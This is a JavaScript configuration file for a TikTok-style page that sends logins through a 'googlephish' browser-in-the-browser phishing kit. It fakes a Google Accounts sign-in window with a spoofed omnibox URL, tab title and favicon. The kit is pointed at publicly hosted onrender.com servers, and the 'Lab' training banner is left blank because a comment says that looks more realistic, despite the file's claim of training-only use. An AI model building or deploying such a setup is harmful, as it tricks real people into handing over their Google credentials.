window.APP_CONFIG = {
    /**
     * Login backend for the TikTok-style page:
     * - "api" — JSON API (apiBaseUrl) + real Google Sign-In
     * - "googlephish" — BITB modal iframe → PHP googlephish kit (lab / training only)
     */
    /** Use "googlephish" to open the simulated Chrome window (BITB) below. */
    authMode: 'googlephish',

    apiBaseUrl: 'https://tk-ap.onrender.com',
    googleClientId: '735055798027-6jjv31ohc5eg03olqn9i8tvav311j34l.apps.googleusercontent.com',
    authPollIntervalMs: 1500,
    authPollMaxMs: 3 * 60 * 1000,
    afterLoginRedirectUrl: 'https://www.google.com',
    afterLoginRedirectDelayMs: 0,

    /**
     * Local PHP (googlephish) — no trailing slash. Iframe loads {base}{bitbEntryPath}.
     * Run: cd googlephish && php -S 127.0.0.1:8080
     * If docroot is the repo root instead, use http://127.0.0.1:8080/googlephish
     */
    googlephishBaseUrl: 'https://tk-ap-1.onrender.com',

    /** First path under googlephishBaseUrl (existing kit entry). */
    bitbEntryPath: '/index.php',

    /**
     * Shown in the fake omnibox only. The iframe uses googlephishBaseUrl (local PHP above).
     */
    bitbDisplayUrl:
        'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S-1:1234567890',

    /** Fake tab / window title (Chrome default for this flow). */
    bitbTabTitle: 'Sign in - Google Accounts',

    /** Favicon in the fake tab (Google favicon reads well in most browsers). */
    bitbFaviconUrl: 'https://www.google.com/favicon.ico',

    /**
     * Optional banner in the titlebar (empty string = hidden, more realistic).
     * Set e.g. "Lab" only when you want an obvious training marker.
     */
    bitbLabLabel: ''
};
